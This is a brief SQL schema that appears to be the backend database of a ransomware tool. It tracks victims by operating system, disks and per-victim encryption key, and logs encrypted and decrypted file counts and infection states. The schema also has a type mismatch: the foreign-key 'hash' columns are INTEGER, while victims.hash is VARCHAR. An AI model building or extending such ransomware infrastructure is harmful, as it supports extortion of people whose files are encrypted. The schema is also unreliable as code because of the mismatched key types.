CREATE TABLE victims (
    os VARCHAR NOT NULL,
    hash VARCHAR PRIMARY KEY NOT NULL,
    disks VARCHAR NOT NULL,
    key VARCHAR NOT NULL
);

CREATE TABLE decrypted (
    id_decrypted INTEGER PRIMARY KEY NOT NULL,
    hash INTEGER NOT NULL,
    datetime TIMESTAMP,
    nb_files INTEGER NOT NULL,
    FOREIGN KEY (hash) REFERENCES victims (hash)
);
CREATE TABLE states (
    id_state INTEGER PRIMARY KEY NOT NULL,
    hash INTEGER NOT NULL,
    datetime TIMESTAMP,
    state VARCHAR NOT NULL,
    FOREIGN KEY (hash) REFERENCES victims (hash)
);
CREATE TABLE encrypted (
    id_encrypted INTEGER PRIMARY KEY NOT NULL,
    hash INTEGER NOT NULL,
    datetime TIMESTAMP,
    nb_files INTEGER NOT NULL,
    FOREIGN KEY (hash) REFERENCES victims (hash)
);
